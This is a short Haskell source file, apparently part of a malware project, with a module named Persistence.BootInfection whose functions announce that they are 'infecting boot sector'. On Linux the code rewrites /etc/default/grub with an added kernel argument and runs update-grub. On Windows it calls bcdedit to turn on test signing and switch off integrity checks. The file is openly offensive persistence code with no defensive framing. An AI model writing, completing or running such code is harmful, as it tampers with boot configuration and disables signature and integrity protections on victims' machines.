-- BootInfection.hs
-- Auto-generated scaffold.

module Persistence.BootInfection where

import System.Directory
import System.FilePath
import System.Posix.Files
import Data.ByteString as BS
import System.Process
import System.Info

infectBootSector :: IO ()
infectBootSector = do
    putStrLn "👾 Infecting boot sector..."
    case os of
        "linux" -> infectGrub
        "mingw32" -> infectWindowsBoot
        _ -> return ()

infectGrub :: IO ()
infectGrub = do
    grubConfig <- readFile "/etc/default/grub"
    let infectedConfig = grubConfig ++ "\nGRUB_CMDLINE_LINUX_DEFAULT=\"malware=stealth\""
    writeFile "/etc/default/grub.infected" infectedConfig
    renameFile "/etc/default/grub.infected" "/etc/default/grub"
    callCommand "update-grub"

infectWindowsBoot :: IO ()
infectWindowsBoot = do
    callCommand "bcdedit /set {current} malware stealth"
    callCommand "bcdedit /set {current} testsigning on"
    callCommand "bcdedit /set {current} nointegritychecks on"
    